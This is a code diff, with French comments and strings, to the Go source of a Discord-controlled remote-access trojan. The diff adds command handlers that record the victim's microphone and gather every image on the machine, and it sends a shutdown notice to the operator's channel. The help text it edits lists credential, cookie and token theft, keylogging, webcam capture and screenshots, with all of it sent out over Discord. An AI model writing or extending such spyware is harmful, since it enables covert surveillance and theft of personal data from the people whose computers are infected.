@@ -367,6 +367,17 @@ func c2Execute(command string) {
 		discordUploadToChannel(fileOut{Name: name, Data: data})
 		discordReply("photo webcam — " + strconv.Itoa(len(data)/1024) + " Ko.")
 
+	case "mic", "micro", "audio":
+		sec := 10
+		if v, err := atoi(args); err == nil && v > 0 {
+			sec = v
+		}
+		discordReply("microphone : enregistrement " + strconv.Itoa(sec) + " s…")
+		discordReply(micRecord(sec))
+
+	case "images", "photos":
+		discordReply(bulkImages())
+
 	case "webcamrec", "camrec":
 		if args == "" {
 			discordReply("usage : !webcamrec <secondes 1-300>")
@@ -526,6 +537,8 @@ func c2Execute(command string) {
 				break
 			}
 		}
+		// Le poste va s éteindre : on le signale dans infos avant de couper.
+		botSendText(infosChannel(), fmt.Sprintf("PC éteint à %s (%s dans %d s).", time.Now().Format("02/01 15:04"), map[bool]string{true: "redémarrage", false: "arrêt"}[restart], timeout))
 		discordReply(shutdownPC(restart, timeout))
 
 	case "wifi":
@@ -683,6 +696,8 @@ func c2Help() string {
 		"!screenshot <s> [m] [n]  captures programmées\n" +
 		"!webcam              photo webcam\n" +
 		"!webcamrec <s>       vidéo webcam AVI (1-300 s)\n" +
+		"!mic [s]             audio du microphone (WAV)\n" +
+		"!images              toutes les images du poste\n" +
 		"!steal               identifiants, cookies, jetons\n" +
 		"!keylog              journal complet\n" +
 		"!keylog on|off       flux 5 s dans le salon keylogs\n" +
